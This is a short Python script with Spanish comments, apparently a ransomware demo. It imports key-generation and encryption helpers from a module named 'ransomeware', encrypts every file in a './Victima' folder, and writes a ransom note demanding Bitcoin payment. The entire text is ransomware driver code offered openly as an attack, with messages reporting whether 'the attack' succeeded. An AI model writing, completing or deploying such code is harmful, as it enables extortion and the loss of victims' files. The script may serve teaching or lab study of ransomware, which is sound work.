from ransomeware import generate_key,get_key,encrypt
import os
if __name__ == '__main__':

    try:
        # Directorio a cifrar.
        path_to_encrypt = './Victima'

        # archivos del directorio a cifrar guardados en una lista.
        items = os.listdir(path_to_encrypt)
        full_path_files = [path_to_encrypt + '/' + item for item in items]

        # clave de cifrado en una variable.
        generate_key()
        key = get_key()

        # Encriptación de los archivos listados.
        encrypt(full_path_files, key)

        # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
        with open('./mensajeVictima.txt', 'w') as file:
            file.write('Todos tus archivos han sido cifrados, paga en Bitcoin para que descifremolos')
        print("El ataque se ha hecho con exito!")
    except:
        print("El ataque ha fallado")